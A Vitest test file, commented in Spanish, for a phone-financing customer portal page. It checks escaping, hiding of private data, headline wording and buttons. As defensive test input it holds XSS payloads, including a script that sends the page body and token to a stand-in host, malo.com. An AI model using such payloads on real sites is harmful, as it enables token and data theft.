// @vitest-environment node
/**
 * La página que abre el cliente desde el WhatsApp.
 *
 * Es una página pública que pinta datos que escribieron personas: el nombre lo
 * teclea quien registra la venta, el producto también, y el motivo de una
 * solicitud de plazo lo escribe el propio cliente desde el formulario. Así que
 * hay dos cosas que comprobar aquí y las dos muerden:
 *
 *  1. Que todo lo que se interpola vaya escapado. Esta página no pide
 *     contraseñas, pero sí lleva un token en el cuerpo y hace `fetch` con él:
 *     un `<script>` metido en el nombre de un cliente se lo lleva.
 *  2. Que el primer renglón diga lo que de verdad pasa. La página existe para
 *     que el cliente no llame a preguntar; si el titular es ambiguo, llama.
 */
import { describe, expect, it } from 'vitest';
import { armarResumenPortal, type ResumenPortal } from '../../server/portal';
import { esc, paginaErrorPortal, paginaPortal } from '../../server/portal-page';

const HOY = '2026-10-10';
const TOKEN = 'fin-001.AbCdEfGhIjKlMnOpQrStUvWx';

function cuota(number: number, dueDate: string, extra: Record<string, unknown> = {}) {
  return { number, dueDate: `${dueDate}T00:00:00.000Z`, status: 'pending', ...extra };
}

function contrato(cambios: Record<string, unknown> = {}) {
  return {
    id: 'fin-001',
    nombre: 'maría camila restrepo',
    cedula: '1047123456',
    telefono: '3002875280',
    imei: '352099001761481',
    producto: 'Redmi Note 13 256GB',
    costoEquipo: 980_000,
    valorCuota: 200_000,
    numeroCuotas: 4,
    cuotasPrevias: 0,
    horaBloqueo: '08:00',
    status: 'active',
    cuotas: [
      cuota(1, '2026-08-10', { status: 'paid' }),
      cuota(2, '2026-09-10', { status: 'paid' }),
      cuota(3, '2026-10-10'),
      cuota(4, '2026-11-10'),
    ],
    ...cambios,
  };
}

function render(
  registro: Record<string, unknown> = contrato(),
  equipo: unknown = null,
  extra: Partial<Parameters<typeof paginaPortal>[0]> = {}
): string {
  return paginaPortal({
    resumen: armarResumenPortal(registro, equipo, HOY),
    token: TOKEN,
    api: 'https://api.ejemplo.com',
    avisoPago: null,
    pagoActivo: true,
    ...extra,
  });
}

/** El primer renglón visible: el titular que decide si el cliente llama o no. */
function titular(html: string): string {
  const sinEtiquetas = html
    .replace(/<style[\s\S]*?<\/style>/g, '')
    .replace(/<script[\s\S]*?<\/script>/g, '')
    .replace(/<[^>]+>/g, '\n');
  return sinEtiquetas.split('\n').map((l) => l.trim()).filter(Boolean).slice(0, 12).join(' | ');
}

/* ══════════════════════════════════════════════════════════════════════════
   Escapado
   ══════════════════════════════════════════════════════════════════════════ */

describe('esc', () => {
  it('neutraliza los cinco caracteres que importan', () => {
    expect(esc('<script>')).not.toContain('<');
    expect(esc('a & b')).not.toContain(' & ');
    expect(esc('"x"')).not.toContain('"');
    expect(esc("'x'")).not.toContain("'");
    expect(esc('<img src=x onerror=alert(1)>')).not.toContain('<img');
  });

  it('escapa el ampersand primero, para no escapar dos veces', () => {
    // Si se sustituyera `<` antes que `&`, un `&lt;` quedaría como `&amp;lt;` y
    // el cliente vería basura en su propio nombre.
    expect(esc('&lt;')).toBe('&amp;lt;');
  });

  it('no revienta con nada', () => {
    expect(esc(null)).toBe('');
    expect(esc(undefined)).toBe('');
    expect(esc(0)).toBe('0');
    expect(esc(false)).toBe('false');
  });
});

describe('la página no deja pasar HTML de nadie', () => {
  const VENENO = '<script>fetch("https://malo.com?t="+document.body.innerHTML)</script>';

  it('escapa el nombre del cliente', () => {
    // El nombre lo teclea quien registra la venta en el panel. Es el campo con
    // más probabilidad de llevar algo raro, aunque sea sin querer.
    const html = render(contrato({ nombre: VENENO }));
    expect(html).not.toContain('<script>fetch');
    expect(html).toContain('&lt;script&gt;');
  });

  it('escapa el nombre del producto', () => {
    const html = render(contrato({ producto: '<img src=x onerror=alert(1)>' }));
    expect(html).not.toContain('<img src=x');
  });

  it('escapa el motivo que escribió el propio cliente', () => {
    // Este es el único campo que el cliente controla de punta a punta, y además
    // vuelve a la misma página que tiene su token.
    const html = render(
      contrato({
        solicitudesPlazo: [
          {
            id: 's1',
            cuotaNumber: 3,
            hasta: '2026-10-14',
            motivo: VENENO,
            pedidaEn: '2026-10-10T12:00:00.000Z',
            estado: 'pendiente',
          },
        ],
      })
    );
    expect(html).not.toContain('<script>fetch');
  });

  it('el token va en un atributo entrecomillado y no se puede escapar de él', () => {
    const html = render(contrato(), null, { token: 'fin-001."><script>alert(1)</script>' });
    expect(html).not.toContain('<script>alert(1)');
  });

  it('no deja etiquetas <script> sueltas más allá de las dos propias', () => {
    // La página lleva dos <script> suyos: el que publica el token y la API, y
    // el guion de los tres botones. Cualquier otro sobra, y contarlos es la
    // forma más simple de notar que apareció uno por un campo sin escapar.
    const limpia = render();
    const envenenada = render(contrato({ nombre: VENENO, producto: VENENO }));
    expect((limpia.match(/<script/g) || []).length).toBe(2);
    expect((envenenada.match(/<script/g) || []).length).toBe(2);
  });
});

/* ══════════════════════════════════════════════════════════════════════════
   Lo que la página no puede filtrar
   ══════════════════════════════════════════════════════════════════════════ */

describe('la página no publica datos que no son del cliente', () => {
  it('ni cédula, ni teléfono, ni IMEI completo, ni el costo del equipo', () => {
    const html = render();
    expect(html).not.toContain('1047123456');
    expect(html).not.toContain('352099001761481');
    expect(html).not.toContain('980000');
    expect(html).not.toContain('980.000');
  });

  it('del IMEI sólo salen los últimos cuatro', () => {
    const html = render();
    expect(html).toContain('1481');
    expect(html).not.toContain('35209900');
  });

  it('pide a los buscadores que no la indexen', () => {
    // El link es público por diseño: quien lo tiene, entra. Lo que no puede
    // pasar es que Google lo encuentre sin tenerlo.
    expect(render()).toContain('noindex');
  });
});

/* ══════════════════════════════════════════════════════════════════════════
   El titular
   ══════════════════════════════════════════════════════════════════════════ */

describe('el primer renglón dice lo que pasa', () => {
  it('al día: no habla de bloqueos', () => {
    const alDia = contrato({ cuotas: [cuota(4, '2026-11-10')] });
    const t = titular(render(alDia));
    expect(t.toLowerCase()).not.toContain('bloquead');
  });

  it('vence hoy: lo dice, con la hora', () => {
    const t = titular(render());
    expect(t.toLowerCase()).toContain('hoy');
    expect(render()).toContain('08:00');
  });

  it('vencida: dice cuántos días', () => {
    const moroso = contrato({ cuotas: [cuota(3, '2026-10-07'), cuota(4, '2026-11-10')] });
    const t = titular(render(moroso));
    expect(t).toContain('3');
  });

  it('con plazo: nombra el plazo en vez de hablar de mora', () => {
    // A quien habló con la tienda y consiguió un plazo no se le puede decir que
    // está vencido: lee que no le registraron el acuerdo y llama a quejarse.
    const conPlazo = contrato({
      cuotas: [
        cuota(3, '2026-10-05', {
          prorroga: { hasta: '2026-10-20', otorgadaEn: '2026-10-04T10:00:00.000Z', otorgadaPor: 'admin' },
        }),
      ],
    });
    const t = titular(render(conPlazo)).toLowerCase();
    expect(t).toContain('plazo');
  });

  it('equipo bloqueado: lo dice antes que nada', () => {
    const moroso = contrato({ cuotas: [cuota(3, '2026-10-01')] });
    const t = titular(render(moroso, { status: 'blocked', plataforma: 'trustonic' })).toLowerCase();
    expect(t).toContain('bloquead');
  });

  it('liquidado: lo celebra y no ofrece pagar nada', () => {
    const liquidado = contrato({
      cuotas: [cuota(1, '2026-08-10', { status: 'paid' }), cuota(2, '2026-09-10', { status: 'paid' })],
    });
    const html = render(liquidado);
    // Se busca el atributo CON valor: el guion de la página lleva siempre el
    // selector `[data-pagar]`, así que buscarlo a secas daría falso positivo.
    expect(html).not.toContain('data-pagar="');
  });

  it('pago aprobado: el aviso manda sobre el estado de la cartera', () => {
    // El cliente vuelve de Bold. Lo primero que necesita leer es que su pago
    // llegó, no el resumen de su deuda de hace un minuto.
    const html = render(contrato(), null, { avisoPago: 'aprobado' });
    expect(titular(html).toLowerCase()).toMatch(/pago|recib/);
  });

  it('pago pendiente: avisa que está esperando y se recarga sola', () => {
    const html = render(contrato(), null, { avisoPago: 'pendiente' });
    expect(html).toContain('__ESPERANDO__');
  });

  it('pago rechazado: no deja al cliente sin saber qué hacer', () => {
    const html = render(contrato(), null, { avisoPago: 'rechazado' });
    expect(titular(html).toLowerCase()).toMatch(/no se|rechaz|intent/);
  });
});

/* ══════════════════════════════════════════════════════════════════════════
   Botones
   ══════════════════════════════════════════════════════════════════════════ */

describe('botones', () => {
  it('con la pasarela activa ofrece pagar', () => {
    const html = render();
    expect(html).toContain('data-pagar="proxima"');
  });

  it('sin la pasarela ofrece WhatsApp y no un botón muerto', () => {
    // Un botón de pagar que no hace nada es peor que no tener botón: el cliente
    // lo pulsa tres veces y después llama.
    const html = render(contrato(), null, { pagoActivo: false });
    expect(html).not.toContain('data-pagar="');
    expect(html).toMatch(/wa\.me|whatsapp/i);
  });

  it('ofrece subir el comprobante', () => {
    expect(render()).toContain('type="file"');
  });

  it('el calendario del plazo no deja pedir fechas imposibles', () => {
    // Sin topes, el cliente pide plazo hasta 2027 y el formulario lo acepta
    // para que el servidor lo rechace después. Mejor que no se pueda ni teclear.
    const html = render();
    expect(html).toContain(`min="${HOY}"`);
    expect(html).toMatch(/max="2026-\d\d-\d\d"/);
  });

  it('sin poder pedir plazo, no pinta el formulario', () => {
    const conPlazo = contrato({
      cuotas: [
        cuota(3, '2026-10-10', {
          prorroga: { hasta: '2026-10-20', otorgadaEn: '2026-10-09T10:00:00.000Z', otorgadaPor: 'admin' },
        }),
      ],
    });
    expect(render(conPlazo)).not.toContain('type="date"');
  });

  it('reduce la foto antes de subirla', () => {
    // Una foto de cámara de celular pesa 2-4 MB y el servidor corta en 700 KB.
    // Sin reducirla en el navegador, el cliente recibe un error y no entiende
    // por qué su comprobante "no sirve".
    const html = render();
    expect(html).toContain('canvas');
    expect(html).toMatch(/1400|0\.75/);
  });
});

/* ══════════════════════════════════════════════════════════════════════════
   La página de error
   ══════════════════════════════════════════════════════════════════════════ */

describe('paginaErrorPortal', () => {
  it('devuelve el código que se le pide', () => {
    expect(paginaErrorPortal('x', 'y', 404).codigo).toBe(404);
    expect(paginaErrorPortal('x', 'y', 503).codigo).toBe(503);
  });

  it('escapa lo que se le pasa', () => {
    const { html } = paginaErrorPortal('<script>alert(1)</script>', '<b>ojo</b>');
    expect(html).not.toContain('<script>alert');
    expect(html).not.toContain('<b>ojo</b>');
  });

  it('no dice si el link no existe o si la firma está mal', () => {
    // Distinguirlos le diría a quien prueba tokens cuándo acertó con un id de
    // contrato. Y al cliente le da igual: su link no funciona y punto.
    const { html } = paginaErrorPortal(
      'Este link no funciona',
      'Puede que sea viejo o que esté incompleto. Escríbenos y te mandamos uno nuevo.'
    );
    expect(html.toLowerCase()).not.toContain('firma');
    expect(html.toLowerCase()).not.toContain('token');
    expect(html.toLowerCase()).not.toContain('inválid');
  });

  it('deja una salida: el teléfono de la tienda', () => {
    const { html } = paginaErrorPortal('Este link no funciona', 'Escríbenos.');
    expect(html).toMatch(/302\s?287\s?5280|wa\.me/);
  });
});

/* ══════════════════════════════════════════════════════════════════════════
   Robustez
   ══════════════════════════════════════════════════════════════════════════ */

describe('la página aguanta datos a medias', () => {
  it('con un registro vacío sigue devolviendo HTML', () => {
    // El portal es público. Un 500 lo lee el cliente como "me borraron el
    // crédito" y acaba en una llamada peor que la que el portal evitaba.
    const resumen: ResumenPortal = armarResumenPortal({}, null, HOY);
    const html = paginaPortal({ resumen, token: TOKEN, api: 'https://api.ejemplo.com', avisoPago: null, pagoActivo: true });
    expect(html).toContain('<!DOCTYPE html>');
    expect(html).toContain('</html>');
  });

  it('con cuotas rotas no se cae', () => {
    expect(() => render({ cuotas: [{}, { number: 'x' }], valorCuota: 0 })).not.toThrow();
  });

  it('el HTML cierra bien las etiquetas que abre', () => {
    const html = render();
    for (const etiqueta of ['html', 'head', 'body', 'style', 'script']) {
      expect((html.match(new RegExp(`<${etiqueta}[\\s>]`, 'g')) || []).length).toBe(
        (html.match(new RegExp(`</${etiqueta}>`, 'g')) || []).length
      );
    }
  });
});
